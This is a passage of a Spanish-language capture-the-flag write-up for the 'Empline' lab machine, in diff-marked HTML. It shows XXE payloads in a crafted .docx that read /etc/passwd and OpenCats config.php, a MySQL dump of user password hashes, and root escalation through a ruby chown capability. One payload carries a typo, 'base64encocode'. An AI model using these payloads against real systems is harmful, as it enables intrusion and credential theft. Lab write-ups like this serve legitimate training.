+</span></span><span class="line"><span class="cl">/constants.php        <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>                                            
+</span></span><span class="line"><span class="cl">/wsdl                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317<span class="o">]</span> <span class="o">[</span>--&gt; http://job.empline.thm/wsdl/<span class="o">]</span>       
+</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 280<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2023/02/13 18:30:51 <span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>De aquí podemos sacar dos directorios interesantes: upload y careers.</p>
+<p>Visitamos careers y pinchamos en <strong>current opening positions</strong>.</p>
+<p><img src="/p/writeup-empline/images/4.PNG"
+	width="1577"
+	height="631"
+	srcset="/p/writeup-empline/images/4_hu14ae832d93fd198f4ae0c6bb8c858a1f_77389_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/4_hu14ae832d93fd198f4ae0c6bb8c858a1f_77389_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="249"
+		data-flex-basis="599px"
+	
+></p>
+<p>Vemos que hay trabajo activo.</p>
+<p><img src="/p/writeup-empline/images/5.PNG"
+	width="1579"
+	height="589"
+	srcset="/p/writeup-empline/images/5_hu560a1c491c59d32d051643d3872ef2ae_63081_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/5_hu560a1c491c59d32d051643d3872ef2ae_63081_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="268"
+		data-flex-basis="643px"
+	
+></p>
+<p>Al entrar podemos aplicar para ese trabajo.</p>
+<p><img src="/p/writeup-empline/images/6.PNG"
+	width="1569"
+	height="589"
+	srcset="/p/writeup-empline/images/6_huf77290feb9e9e3288982fd6002fb8373_90195_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/6_huf77290feb9e9e3288982fd6002fb8373_90195_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="266"
+		data-flex-basis="639px"
+	
+></p>
+<p>A la hora de poder aplicar para este trabajo vemos que nos deja subir archivos(como por ejemplo un CV).Si nos fijamos en la version que se muestra de OpenCats que sale en el login y buscamos por alguna vulnerabilidad podremos encontrar el siguiente post en el cual se explica paso a paso como explotar cierta vulnerabilidad.</p>
+<p><img src="/p/writeup-empline/images/7.PNG"
+	width="1576"
+	height="565"
+	srcset="/p/writeup-empline/images/7_hua25abac43beb598e5c1fd19a13252302_87479_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/7_hua25abac43beb598e5c1fd19a13252302_87479_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="278"
+		data-flex-basis="669px"
+	
+></p>
+<p><a class="link" href="https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/"  target="_blank" rel="noopener"
+    >https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/</a></p>
+<h3 id="escalada">Escalada</h3>
+<p>El primer paso es crear un archivo .docx, en este caso lo hacemos un un script sencillo den python.</p>
+<p><img src="/p/writeup-empline/images/8.PNG"
+	width="537"
+	height="159"
+	srcset="/p/writeup-empline/images/8_hued0e1e58a7961f1bfe8c4f057e96c7fc_12449_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/8_hued0e1e58a7961f1bfe8c4f057e96c7fc_12449_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="337"
+		data-flex-basis="810px"
+	
+></p>
+<p><img src="/p/writeup-empline/images/9.PNG"
+	width="737"
+	height="69"
+	srcset="/p/writeup-empline/images/9_hu8e1b71c0dafba2944b692cfb29de6464_8919_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/9_hu8e1b71c0dafba2944b692cfb29de6464_8919_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1068"
+		data-flex-basis="2563px"
+	
+></p>
+<p>Aqui os dejo el script para que podias usarlo.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">docx</span> <span class="kn">import</span> <span class="n">Document</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">document</span> <span class="o">=</span> <span class="n">Document</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">paragraph</span> <span class="o">=</span> <span class="n">document</span><span class="o">.</span><span class="n">add_paragraph</span><span class="p">(</span><span class="s1">&#39;Liv3P0ol&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">document</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s1">&#39;Liv3P0ol.docx&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Si en este momento decicimos subir el archivo que hemos creado vamos a ver que no devuelve como output el texto que hemos escrito, en este caso es Liv3P0ol.</p>
+<p><img src="/p/writeup-empline/images/10.PNG"
+	width="449"
+	height="163"
+	srcset="/p/writeup-empline/images/10_huba8b201bb826e40bd32adb83e133e8a8_15887_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/10_huba8b201bb826e40bd32adb83e133e8a8_15887_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="275"
+		data-flex-basis="661px"
+	
+></p>
+<p>Ahora como siguiente paso es descomprimir el documento .docx que tenemos ya que este no es mas que documentos .xml comprimidos. Procedemos a modificar el word/document.xml.</p>
+<p><img src="/p/writeup-empline/images/11.PNG"
+	width="1469"
+	height="419"
+	srcset="/p/writeup-empline/images/11_hucdb571f08e563ad657625b645f406edd_99668_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/11_hucdb571f08e563ad657625b645f406edd_99668_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="350"
+		data-flex-basis="841px"
+	
+></p>
+<p>De primeras se puede introducir este comando para poder ver si funciona y ademas podemos observar el /etc/passwd.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;!DOCTYPE <span class="nb">test</span> <span class="o">[</span>&lt;!ENTITY <span class="nb">test</span> SYSTEM <span class="s1">&#39;file:///etc/passwd&#39;</span>&gt;<span class="o">]</span>&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Una vez probamos y vemos que funciona lo siguiente sera listar el contenido del archivo config.php el cual contiene usuarios y contraseñas de OpenCats.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s1">&#39;1.0&#39;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s1">&#39;UTF-8&#39;</span> <span class="nv">standalone</span><span class="o">=</span><span class="s1">&#39;yes&#39;</span>?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE <span class="nb">test</span> <span class="o">[</span>&lt;!ENTITY <span class="nb">test</span> SYSTEM <span class="s1">&#39;php://filter/convert.base64encocode/resource=config.php&#39;</span>&gt;<span class="o">]</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;w:document xmlns:wpc<span class="o">=</span><span class="s2">&#34;http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas&#34;</span> xmlns:mo<span class="o">=</span><span class="s2">&#34;http://schemas.microsoft.com/office/mac/office/2008/main&#34;</span> xmlns:mc<span class="o">=</span><span class="s2">&#34;http://schemas.openxmlformats.org/markup-compatibility/2006&#34;</span> xmlns:mv<span class="o">=</span><span class="s2">&#34;urn:schemas-microsoft-com:mac:vml&#34;</span> xmlns:o<span class="o">=</span><span class="s2">&#34;urn:schemas-microsoft-com:office:office&#34;</span> xmlns:r<span class="o">=</span><span class="s2">&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships&#34;</span> xmlns:m<span class="o">=</span><span class="s2">&#34;http://schemas.op
+</span></span></span><span class="line"><span class="cl"><span class="s2">enxmlformats.org/officeDocument/2006/math&#34;</span> xmlns:v<span class="o">=</span><span class="s2">&#34;urn:schemas-microsoft-com:vml&#34;</span> xmlns:wp14<span class="o">=</span><span class="s2">&#34;http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing&#34;</span> xmlns:wp<span class="o">=</span><span class="s2">&#34;http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing&#34;</span> xmlns:w10<span class="o">=</span><span class="s2">&#34;urn:schemas-microsoft-com:office:word&#34;</span> xmlns:w<span class="o">=</span><span class="s2">&#34;http://schemas.openxmlformats.org/wordprocessingml/2006/main&#34;</span> xmlns:w14<span class="o">=</span><span class="s2">&#34;http://schemas.microsoft.com/office/word/2010/wordm
+</span></span></span><span class="line"><span class="cl"><span class="s2">l&#34;</span> xmlns:wpg<span class="o">=</span><span class="s2">&#34;http://schemas.microsoft.com/office/word/2010/wordprocessingGroup&#34;</span> xmlns:wpi<span class="o">=</span><span class="s2">&#34;http://schemas.microsoft.com/office/word/2010/wordprocessingInk&#34;</span>xmlns:wne<span class="o">=</span><span class="s2">&#34;http://schemas.microsoft.com/office/word/2006/wordml&#34;</span>xmlns:wps<span class="o">=</span><span class="s2">&#34;http://schemas.microsoft.com/office/word/2010/wordprocessingShape&#34;</span>mc:Ignorable<span class="o">=</span><span class="s2">&#34;w14 wp14&#34;</span>&gt;&lt;w:body&gt;&lt;w:p&gt;&lt;w:r&gt;&lt;w:t&gt;Liv3P0ol&lt;/w:t&lt;/w:r&gt;&lt;/w:p&gt;&lt;w:sectPr w:rsidR<span class="o">=</span><span class="s2">&#34;00FC693F&#34;</span> w:rsidRPr<span class="o">=</span><span class="s2">&#34;0006063C&#34;</span> w:rsidSect<span class="o">=</span><span class="s2">&#34;00034616&#34;</span>&gt;&lt;w:pgSzw:w<span class="o">=</span><span class="s2">&#34;12240&#34;</span> w:h<span class="o">=</span><span class="s2">&#34;15840&#34;</span>/&gt;&lt;w:pgMar w:top<span class="o">=</span><span class="s2">&#34;1440&#34;</span> w:right<span class="o">=</span><span class="s2">&#34;1800&#34;</span> w:bottom<span class="o">=</span><span class="s2">&#34;1440&#34;</span>w:left<span class="o">=</span><span class="s2">&#34;1800&#34;</span> w:header<span class="o">=</span><span class="s2">&#34;720&#34;</span> w:footer<span class="o">=</span><span class="s2">&#34;720&#34;</span> w:gutter<span class="o">=</span><span class="s2">&#34;0&#34;</span>/&gt;&lt;w:cols w:space<span class="o">=</span><span class="s2">&#34;720&#34;</span>/&gt;&lt;w:docGridw:linePitch<span class="o">=</span><span class="s2">&#34;360&#34;</span>/&gt;&lt;/w:sectPr&gt;&lt;/w:body&gt;&lt;/w:document&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Donde se encuentra el texto que tiene nuestro documento de texto hay que cambiarlo y poner &amp;test.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bas" data-lang="bas"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="vg">xml</span><span class="w"> </span><span class="vg">version</span><span class="o">=</span><span class="c1">&#39;1.0&#39; encoding=&#39;UTF-8&#39; standalone=&#39;yes&#39;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;!</span><span class="vg">DOCTYPE</span><span class="w"> </span><span class="vg">test</span><span class="w"> </span><span class="p">[</span><span class="o">&lt;!</span><span class="vg">ENTITY</span><span class="w"> </span><span class="vg">test</span><span class="w"> </span><span class="kr">SYSTEM</span><span class="w"> </span><span class="c1">&#39;php://filter/convert.base64encocode/resource=config.php&#39;&gt;]&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nl">w:</span><span class="vg">document</span><span class="w"> </span><span class="nl">xmlns:</span><span class="vg">wpc</span><span class="o">=</span><span class="s2">&#34;http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas&#34;</span><span class="w"> </span><span class="nl">xmlns:</span><span class="vg">mo</span><span class="o">=</span><span class="s2">&#34;http://schemas.microsoft.com/office/mac/office/2008/main&#34;</span><span class="w"> </span><span class="nl">xmlns:</span><span class="vg">mc</span><span class="o">=</span><span class="s2">&#34;http://schemas.openxmlformats.org/markup-compatibility/2006&#34;</span><span class="w"> </span><span class="nl">xmlns:</span><span class="vg">mv</span><span class="o">=</span><span class="s2">&#34;urn:schemas-microsoft-com:mac:vml&#34;</span><span class="w"> </span><span class="nl">xmlns:</span><span class="vg">o</span><span class="o">=</span><span class="s2">&#34;urn:schemas-microsoft-com:office:office&#34;</span><span class="w"> </span><span class="nl">xmlns:</span><span class="vg">r</span><span class="o">=</span><span class="s2">&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships&#34;</span><span class="w"> </span><span class="nl">xmlns:</span><span class="vg">m</span><span class="o">=</span><span class="err">&#34;</span><span class="nl">http:</span><span class="o">//</span><span class="vg">schemas</span><span class="o">.</span><span class="vg">op</span>
+</span></span><span class="line"><span class="cl"><span class="vg">enxmlformats</span><span class="o">.</span><span class="vg">org</span><span class="o">/</span><span class="vg">officeDocument</span><span class="o">/</span><span class="il">2006</span><span class="o">/</span><span class="vg">math</span><span class="s2">&#34; xmlns:v=&#34;</span><span class="nl">urn:</span><span class="vg">schemas</span><span class="o">-</span><span class="vg">microsoft</span><span class="o">-</span><span class="nl">com:</span><span class="vg">vml</span><span class="s2">&#34; xmlns:wp14=&#34;</span><span class="nl">http:</span><span class="o">//</span><span class="vg">schemas</span><span class="o">.</span><span class="vg">microsoft</span><span class="o">.</span><span class="vg">com</span><span class="o">/</span><span class="vg">office</span><span class="o">/</span><span class="vg">word</span><span class="o">/</span><span class="il">2010</span><span class="o">/</span><span class="vg">wordprocessingDrawing</span><span class="s2">&#34; xmlns:wp=&#34;</span><span class="nl">http:</span><span class="o">//</span><span class="vg">schemas</span><span class="o">.</span><span class="vg">openxmlformats</span><span class="o">.</span><span class="vg">org</span><span class="o">/</span><span class="vg">drawingml</span><span class="o">/</span><span class="il">2006</span><span class="o">/</span><span class="vg">wordprocessingDrawing</span><span class="s2">&#34; xmlns:w10=&#34;</span><span class="nl">urn:</span><span class="vg">schemas</span><span class="o">-</span><span class="vg">microsoft</span><span class="o">-</span><span class="nl">com:office:</span><span class="vg">word</span><span class="s2">&#34; xmlns:w=&#34;</span><span class="nl">http:</span><span class="o">//</span><span class="vg">schemas</span><span class="o">.</span><span class="vg">openxmlformats</span><span class="o">.</span><span class="vg">org</span><span class="o">/</span><span class="vg">wordprocessingml</span><span class="o">/</span><span class="il">2006</span><span class="o">/</span><span class="vg">main</span><span class="s2">&#34; xmlns:w14=&#34;</span><span class="nl">http:</span><span class="o">//</span><span class="vg">schemas</span><span class="o">.</span><span class="vg">microsoft</span><span class="o">.</span><span class="vg">com</span><span class="o">/</span><span class="vg">office</span><span class="o">/</span><span class="vg">word</span><span class="o">/</span><span class="il">2010</span><span class="o">/</span><span class="vg">wordm</span>
+</span></span><span class="line"><span class="cl"><span class="vg">l</span><span class="s2">&#34; xmlns:wpg=&#34;</span><span class="nl">http:</span><span class="o">//</span><span class="vg">schemas</span><span class="o">.</span><span class="vg">microsoft</span><span class="o">.</span><span class="vg">com</span><span class="o">/</span><span class="vg">office</span><span class="o">/</span><span class="vg">word</span><span class="o">/</span><span class="il">2010</span><span class="o">/</span><span class="vg">wordprocessingGroup</span><span class="s2">&#34; xmlns:wpi=&#34;</span><span class="nl">http:</span><span class="o">//</span><span class="vg">schemas</span><span class="o">.</span><span class="vg">microsoft</span><span class="o">.</span><span class="vg">com</span><span class="o">/</span><span class="vg">office</span><span class="o">/</span><span class="vg">word</span><span class="o">/</span><span class="il">2010</span><span class="o">/</span><span class="vg">wordprocessingInk</span><span class="s2">&#34;xmlns:wne=&#34;</span><span class="nl">http:</span><span class="o">//</span><span class="vg">schemas</span><span class="o">.</span><span class="vg">microsoft</span><span class="o">.</span><span class="vg">com</span><span class="o">/</span><span class="vg">office</span><span class="o">/</span><span class="vg">word</span><span class="o">/</span><span class="il">2006</span><span class="o">/</span><span class="vg">wordml</span><span class="s2">&#34;xmlns:wps=&#34;</span><span class="nl">http:</span><span class="o">//</span><span class="vg">schemas</span><span class="o">.</span><span class="vg">microsoft</span><span class="o">.</span><span class="vg">com</span><span class="o">/</span><span class="vg">office</span><span class="o">/</span><span class="vg">word</span><span class="o">/</span><span class="il">2010</span><span class="o">/</span><span class="vg">wordprocessingShape</span><span class="s2">&#34;mc:Ignorable=&#34;</span><span class="vg">w14</span><span class="w"> </span><span class="vg">wp14</span><span class="s2">&#34;&gt;&lt;w:body&gt;&lt;w:p&gt;&lt;w:r&gt;&lt;w:t&gt;&amp;test;&lt;/w:t&lt;/w:r&gt;&lt;/w:p&gt;&lt;w:sectPr w:rsidR=&#34;</span><span class="il">00</span><span class="vg">FC693F</span><span class="s2">&#34; w:rsidRPr=&#34;</span><span class="il">0006063</span><span class="vg">C</span><span class="s2">&#34; w:rsidSect=&#34;</span><span class="il">00034616</span><span class="s2">&#34;&gt;&lt;w:pgSzw:w=&#34;</span><span class="il">12240</span><span class="s2">&#34; w:h=&#34;</span><span class="il">15840</span><span class="s2">&#34;/&gt;&lt;w:pgMar w:top=&#34;</span><span class="il">1440</span><span class="s2">&#34; w:right=&#34;</span><span class="il">1800</span><span class="s2">&#34; w:bottom=&#34;</span><span class="il">1440</span><span class="s2">&#34;w:left=&#34;</span><span class="il">1800</span><span class="s2">&#34; w:header=&#34;</span><span class="il">720</span><span class="s2">&#34; w:footer=&#34;</span><span class="il">720</span><span class="s2">&#34; w:gutter=&#34;</span><span class="il">0</span><span class="s2">&#34;/&gt;&lt;w:cols w:space=&#34;</span><span class="il">720</span><span class="s2">&#34;/&gt;&lt;w:docGridw:linePitch=&#34;</span><span class="il">360</span><span class="err">&#34;</span><span class="o">/&gt;&lt;/</span><span class="nl">w:</span><span class="vg">sectPr</span><span class="o">&gt;&lt;/</span><span class="nl">w:</span><span class="vg">body</span><span class="o">&gt;&lt;/</span><span class="nl">w:</span><span class="vg">document</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Volvemos a meter el archivo que hemos modificado en el documento .docx que teniamos.</p>
+<p><img src="/p/writeup-empline/images/12.PNG"
+	width="515"
+	height="45"
+	srcset="/p/writeup-empline/images/12_hu91353d7c943c26f159a3c6fa07f44698_6385_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/12_hu91353d7c943c26f159a3c6fa07f44698_6385_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1144"
+		data-flex-basis="2746px"
+	
+></p>
+<p>Al subirlo vemos que nos devuelve lo que esperabamos pero en base64, por lo que vamos a tener que revertirlo y ver la información en texto plano.</p>
+<p><img src="/p/writeup-empline/images/13.PNG"
+	width="479"
+	height="335"
+	srcset="/p/writeup-empline/images/13_huebf79c99ee1556aa1d0137bdce05ff35_61912_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/13_huebf79c99ee1556aa1d0137bdce05ff35_61912_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="142"
+		data-flex-basis="343px"
+	
+></p>
+<p>Usamos Cyberchef, y vemos datos los cuales podemos usar para poder conectarnos a mysql teniendo el usuario, password y la IP de la máquina.</p>
+<p><img src="/p/writeup-empline/images/14.PNG"
+	width="1579"
+	height="561"
+	srcset="/p/writeup-empline/images/14_hu963e216566948d3208e5d4304e9d169f_163185_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/14_hu963e216566948d3208e5d4304e9d169f_163185_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="281"
+		data-flex-basis="675px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql -u james -h 10.10.212.220 -p
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[(</span>none<span class="o">)]</span>&gt; show databases<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Database           <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> information_schema <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> opencats           <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[(</span>none<span class="o">)]</span>&gt; use opencats<span class="p">;</span>
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[</span>opencats<span class="o">]</span>&gt; show tables<span class="p">;</span>
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[</span>opencats<span class="o">]</span>&gt; describe user<span class="p">;</span>
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[</span>opencats<span class="o">]</span>&gt; <span class="k">select</span> user_name,password from user<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+----------------+----------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> user_name      <span class="p">|</span> password                         <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----------------+----------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> admin          <span class="p">|</span> b67b5ecc5d8902ba59c65596e4c053ec <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> cats@rootadmin <span class="p">|</span> cantlogin                        <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> george         <span class="p">|</span> 86d0dfda99dbebc424eb4407947356ac <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> james          <span class="p">|</span> e53fbdb31890ff3bc129db0e27c473c9 <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----------------+----------------------------------+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Sacamos los hashes de contraseñas y porcedemos a crackerlos.Con esto sacamos la contraseña de George. Con esta nos conectaremos a través de <code>ssh</code> y procedemos a sacar la flag de usuario.</p>
+<p><img src="/p/writeup-empline/images/15.PNG"
+	width="793"
+	height="291"
+	srcset="/p/writeup-empline/images/15_hu0a3a2f5e2816b9eaa78da30f97ebd546_28693_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/15_hu0a3a2f5e2816b9eaa78da30f97ebd546_28693_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="272"
+		data-flex-basis="654px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh george@10.10.212.220
+</span></span><span class="line"><span class="cl">george@empline:~$ ls
+</span></span><span class="line"><span class="cl">user.txt
+</span></span><span class="line"><span class="cl">george@empline:~$ cat user.txt 
+</span></span><span class="line"><span class="cl">91cb89c70aa2e5ce0e0116dab099078e
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Enumerando el sistema vemos que en la capabilities podemos cambiar el propietario de un archivo con ruby.</p>
+<p><img src="/p/writeup-empline/images/16.PNG"
+	width="511"
+	height="57"
+	srcset="/p/writeup-empline/images/16_hu2db94f6a71b6ae8457ff2a567553d565_8603_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/16_hu2db94f6a71b6ae8457ff2a567553d565_8603_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="896"
+		data-flex-basis="2151px"
+	
+></p>
+<p>Procedemos a crear un script en ruby el cual lea y coja el output del archivo /etc/passwd y despues creemos uno en el cual le demos permisos a George que es el usuario con el uid y gid 1002.</p>
+<p><img src="/p/writeup-empline/images/17.PNG"
+	width="521"
+	height="157"
+	srcset="/p/writeup-empline/images/17_hu957e3613e8a5c0a9ddcb08ba148bb971_7874_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/17_hu957e3613e8a5c0a9ddcb08ba148bb971_7874_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="331"
+		data-flex-basis="796px"
+	
+></p>
+<p><img src="/p/writeup-empline/images/18.PNG"
+	width="577"
+	height="23"
+	srcset="/p/writeup-empline/images/18_hu7ecca01ff8b13d0467725997f03434f6_3066_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/18_hu7ecca01ff8b13d0467725997f03434f6_3066_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="2508"
+		data-flex-basis="6020px"
+	
+></p>
+<p>Ahora generaremos una contraseña la cual la vamos a sustituir por la que tiene el usuario <strong>Root</strong> actualmente.</p>
+<p><img src="/p/writeup-empline/images/19.PNG"
+	width="463"
+	height="37"
+	srcset="/p/writeup-empline/images/19_hu7c7e8ab773bc56a5ad36abfde02c9fa4_4947_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/19_hu7c7e8ab773bc56a5ad36abfde02c9fa4_4947_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1251"
+		data-flex-basis="3003px"
+	
+></p>
+<p><img src="/p/writeup-empline/images/20.PNG"
+	width="497"
+	height="33"
+	srcset="/p/writeup-empline/images/20_hu48897009cddcce6c8d374ed559f447c3_3372_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/20_hu48897009cddcce6c8d374ed559f447c3_3372_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1506"
+		data-flex-basis="3614px"
+	
+></p>
+<p>Y procedemos a cambiar de usuario a <strong>Root</strong> y obtener la flag.</p>
+<p><img src="/p/writeup-empline/images/21.PNG"
+	width="451"
+	height="99"
+	srcset="/p/writeup-empline/images/21_hu5e15ed33bab424af14c94fdf64c78d07_10632_480x0_resize_box_3.PNG 480w, /p/writeup-empline/images/21_hu5e15ed33bab424af14c94fdf64c78d07_10632_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="455"
+		data-flex-basis="1093px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Contenidos relacionados</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/writeup-gallery/">
+        
+        
+            <div class="article-image">
+                <img src="/p/writeup-gallery/logo.727f299e35227fb83a864d94ae8373fb_hua0b92525cbc2653ca50d40ec787593a2_15704_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post WriteUp Gallery"
+                        
+                        data-hash="md5-cn8pnjUif7g6hk2UroNz&#43;w==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">WriteUp Gallery</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
